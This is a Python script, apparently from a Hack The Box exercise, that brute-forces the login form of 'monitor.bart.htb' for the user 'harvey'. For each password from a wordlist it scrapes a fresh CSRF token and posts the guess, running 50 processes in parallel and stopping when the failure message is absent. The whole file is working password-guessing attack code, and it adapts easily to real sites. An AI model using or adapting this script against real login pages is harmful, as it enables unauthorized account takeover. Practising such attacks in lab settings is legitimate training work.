#!/usr/bin/env python3

import re
import requests
import sys
from multiprocessing import Pool


# Definitions / constants
MAX_PROC = 50
url = "http://monitor.bart.htb/"
csrf_re = 'name="csrf" value="(.*)"'
username = "harvey"

# Start a session, automatically set cookies
s = requests.Session()

def usage():
    print("{} <wordlist>".format(sys.argv[0]))
    print("wordlist should be one word per line")
    sys.exit(1)


# Get CSRF token, use it to send login request, return if worked or not
def brute(password):
    r = s.get(url)
    csrf = re.findall(csrf_re, r.text)[0]
    
    data = {"csrf": csrf,
        "user_name": username,
        "user_password": password,
        "action":"login"}
    r = s.post(url, data=data)

    if "The information is incorrect" in r.text:
        return password, False
    else:
        return password, True


# Take words, send it to brute function while leveraging multiprocessing
def main(wordlist, nprocs=MAX_PROC):
    with open(wordlist, 'r', encoding='latin-1') as f:
        words = f.read().rstrip().replace('\r','').split('\n')

    pool = Pool(processes=nprocs)

    i=0
    print_status(0,len(words))
    for password, status in pool.imap_unordered(brute, [passwd for passwd in words]):
        if status:
            sys.stdout.write("\n[+] Found password: {} \n".format(password))
            pool.terminate()
            sys.exit(0)
        else:
            i += 1
            print_status(i, len(words))

    print("\n\n[-] Password not found\n")


# ~ a e s t h e t i c s ~
def print_status(i, l, max=30):
    sys.stdout.write("\r|{}>{}|  {:>15}/{}".format( "=" * ((i * max)//l), " " * (max - ((i * max)//l)), i, l))


if __name__ == '__main__':
    if len(sys.argv) != 2:
        usage()
    main(sys.argv[1])


